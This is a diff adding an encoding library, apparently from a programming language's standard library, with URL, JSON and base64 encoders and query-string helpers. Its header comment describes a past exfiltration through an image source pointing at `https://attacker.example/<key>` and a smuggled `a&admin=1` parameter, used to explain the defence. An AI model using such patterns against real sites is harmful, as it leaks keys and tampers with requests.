@@ -1,0 +1,122 @@
+# Encoding a value so that it survives being put inside something else.
+#
+# ⚠️ WHY THIS IS NOT A CONVENIENCE. §14G.1.3(c)'s sink list is closed at
+# seven, and sink 7 is the outbound request: a URL-bearing argument on any
+# element — `href`, `src`, and the sixteen others `zdc-hir/src/url.rs`
+# names — is a place a value chooses the host the browser sends to. It is
+# a separate sink from the view, and E-IFC-11 is a separate diagnostic
+# from E-IFC-05, because the two catch different escapes. `Image source is
+# apiKey` renders no visible text and appears in no response body, and the
+# browser still fetches `https://attacker.example/<key>` before paint.
+# That was a working exfiltration and STATUS.md records it as one.
+#
+# The flow pass closes that hole for a **secret**, and closes it
+# completely: there is no declassification that reaches a URL. What no
+# analysis closes is the ordinary value that arrives at a URL malformed,
+# because it was concatenated in. `"q=" + typed` where `typed` holds
+# `a&admin=1` is two parameters and not one, and neither the flow pass nor
+# `safeUrl` has an opinion about it: the first is about secrecy and the
+# second about the scheme, and this is about the structure in between.
+#
+# So an encoder is the affordance that makes the safe spelling the short
+# one. `queryPart` below is one call where the concatenation is three
+# tokens, and it is the spelling a program reaches for **instead** of
+# building a URL out of `+`. It composes with the sink rather than
+# competing with it: the flow pass still refuses a secret that reaches a
+# URL after passing through `urlEncoded`, because encoding a secret does
+# not make it public, and that is the right answer — an encoded key is
+# still a key at the far end.
+#
+# ⚠️ ALL THREE ARE PRIMITIVES, AND THE REASON IS ONE REASON. Each is a
+# statement about the **bytes** of a `Text`, and the language has no way
+# to observe a byte or even a code point's number. `textAt` gives back a
+# one character `Text`, not the number that character is, so a ZDeceptron
+# definition cannot begin: percent-encoding needs the UTF-8 encoding of a
+# character, base64 needs its bytes six at a time, and JSON's escape for a
+# control character needs its code point in hexadecimal. §17.4.10 already
+# named "inspecting a `Text`" as the thing the language cannot do; this is
+# the same finding one level further down.
+#
+# All three carry `gives pure`, and that is a claim worth making out loud
+# rather than by omission: an encoder is a function of its argument, it
+# reads nothing, and it returns the same text everywhere. So none of them
+# raises the question of where an impure primitive may be called, and none
+# of them depends on an answer to it.
+#
+# Encoding only, and deliberately. Decoding is a parse, so it can fail and
+# would have to give an `Option`, and nothing in the language reads an
+# inbound URL or an inbound JSON document yet. It belongs with the thing
+# that needs it rather than ahead of it.
+
+# `value` with every character that structures a URL replaced by its
+# percent-encoded UTF-8 bytes. O(n).
+#
+# The component form, not the whole-URL form: `/`, `?`, `#`, `&` and `=`
+# are all escaped, because inside a path segment or a parameter every one
+# of them is data rather than syntax. There is no second function for the
+# whole-URL form. A program builds a URL out of parts, and a `foreign`
+# that escaped less would be a second spelling of one operation, which
+# §4.1 refuses.
+#
+# The unreserved set — letters, digits, `-`, `_`, `.` and `~` — is left
+# alone, so an ordinary word comes back unchanged.
+foreign urlEncoded is anywhere
+    from "zd:encode" as "url"
+    takes of value is Text
+    gives pure Text
+
+# `value` as a JSON string, **quotes included**. O(n).
+#
+# The quotes are part of the answer because the answer is a JSON value
+# ready to be concatenated into a body, not a fragment that still needs
+# punctuation around it. A caller that has to add the quotes is a caller
+# that can forget to.
+#
+# The quote and the backslash are the two escapes a reader thinks of, and
+# they are not the reason this is a primitive: `replace` could do both.
+# The control characters are the reason. The lexer's string rule admits no
+# escapes, so no ZDeceptron literal can name a character below U+0020, and
+# `replace` cannot match what nothing can write down.
+foreign jsonEncoded is anywhere
+    from "zd:encode" as "json"
+    takes of value is Text
+    gives pure Text
+
+# `value`'s UTF-8 bytes in the standard base64 alphabet, padded with `=`.
+# O(n).
+#
+# Over the bytes, which is what makes it total. The platform's own `btoa`
+# is not: it reads its argument as one byte per code unit and throws on
+# anything above U+00FF, so `base64Encoded of "é"` would be an exception
+# rather than a value.
+foreign base64Encoded is anywhere
+    from "zd:encode" as "base64"
+    takes of value is Text
+    gives pure Text
+
+# One query parameter, both halves encoded. O(n).
+#
+# The name as well as the value. A parameter name that came from data is
+# no safer than a value that did, and a function that encoded one half
+# would teach that it is.
+function queryPart with name, value
+    give (urlEncoded of name) + "=" + (urlEncoded of value)
+
+# Every entry of `parameters` as a query string, in insertion order, with
+# `&` between and both halves of each entry encoded. O(n) in the total
+# length.
+#
+# An empty map is the empty text and not a stray `&`, which is the case a
+# fold that always writes its separator first gets wrong.
+function queryText of parameters
+    give queryFrom with parameters is parameters, index is 0, taken is ""
+
+function queryFrom with parameters, index, taken
+    when mapKeyAt with value is parameters, index is index
+        None
+            give taken
+        Some with key
+            with part is (queryPart with name is key, value is (atOr with table is parameters, key is key, fallback is ""))
+            if index is 0
+                give queryFrom with parameters is parameters, index is 1, taken is part
+            give queryFrom with parameters is parameters, index is index + 1, taken is taken + "&" + part
